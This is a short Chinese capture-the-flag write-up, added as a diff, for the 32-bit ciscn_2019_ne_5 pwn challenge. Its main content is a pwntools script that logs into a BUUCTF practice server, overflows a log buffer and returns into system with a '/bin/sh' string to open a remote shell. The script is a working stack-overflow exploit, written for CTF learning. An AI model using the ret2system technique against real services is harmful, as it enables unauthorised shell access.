@@ -1,0 +1,29 @@
+<p>放进Linux一看是32位<br>进入ida对main不能直接F5<br>先进入scanf函数编译，再编译main<br><img src="https://img-blog.csdnimg.cn/20210209161735873.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3d1eXZsZQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<!--more-->
+<p>我们发现这是一个菜单表，输入administrator后进入菜单，而且这里s1只给了48个大小，而可以输入100个字节，可以溢出<br>我们进菜单1看看<br><img src="https://img-blog.csdnimg.cn/20210209161942880.png" alt="在这里插入图片描述"><br>看看菜单3<br><img src="https://img-blog.csdnimg.cn/20210209162204893.png" alt="在这里插入图片描述"><br>找到system函数了，接下来找到system地址和/bin/sh的地址</p>
+<pre><code class="python">from pwn import*
+
+r=remote(&quot;node3.buuoj.cn&quot;,29791)
+elf=ELF(&#39;ciscn_2019_ne_5&#39;)
+system_addr=elf.sym[&#39;system&#39;]
+shell_addr=0x80482ea
+
+r.recvuntil(&#39;Please input admin password:&#39;)
+r.sendline(&#39;administrator&#39;)
+
+r.recvuntil(&#39;0.Exit\n:&#39;)
+r.sendline(&#39;1&#39;)
+
+payload=&#39;a&#39;*(0x48+4)+p32(system_addr)+&#39;1234&#39;+p32(shell_addr)
+
+r.recvuntil(&#39;Please input new log info:&#39;)
+r.sendline(payload)
+
+r.recvuntil(&#39;0.Exit\n:&#39;)
+r.sendline(&#39;4&#39;)
+
+r.interactive()
+
+
+
+</code></pre>
